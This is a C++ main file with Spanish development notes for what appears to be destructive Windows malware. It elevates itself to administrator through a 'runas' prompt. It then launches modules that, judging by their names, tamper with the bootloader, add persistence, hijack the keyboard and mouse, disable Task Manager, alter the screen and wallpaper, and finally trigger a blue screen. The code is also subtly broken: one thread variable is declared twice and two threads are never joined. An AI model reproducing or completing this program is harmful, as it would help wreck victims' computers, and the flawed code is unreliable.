// g++ main.cpp -o Asa.exe -std=c++17 -mwindows -lole32 -luuid -lntdll -lwinmm -lgdi32 -D__DEBUG__

// APUNTES:
// 09 - 09 - 2023 | El error que tiene bootloader.cpp a sido los privilegios, es necesario tener privilegios

//11 -09 - 2023 | Lo eejcute y se puso como administrador pero hay un problema  el wallpaper no se me puso y no se porque

#include <Windows.h>
#include <shellapi.h>
#include <thread>
#include <wbemidl.h>
#include <iostream>
#include "backgroundcmd.cpp"
#include "persistent.cpp"
#include "taskmanager.cpp"
#include "mouse.cpp"
#include "wallpaper.cpp"
#include "screen.cpp"
#include "keyboard.cpp"
#include "bootloader.cpp"
#include "bsod.cpp"

bool IsRunAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }
    return isAdmin == TRUE;
}
int main() {
    if (!IsRunAsAdmin()) {
        WCHAR path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOWNORMAL);
        return 0;
    }
    std::thread t1(wallpaper);
    std::thread t2(bootloader);
    std::thread t3(screen);
    std::thread t4(backgroundcmd);
    std::thread t5(persistent);
    std::thread t6(keyboard);
    std::thread t7(taskmanager);
    std::thread t8(mouse);
    std::thread t3(screen);
    std::this_thread::sleep_for(std::chrono::seconds(15));
    std::thread t10(bsod);
    t1.join();
    t2.join();
    t3.join();
    t4.join();
    t5.join();
    t6.join();
    t10.join();
    return EXIT_SUCCESS;
}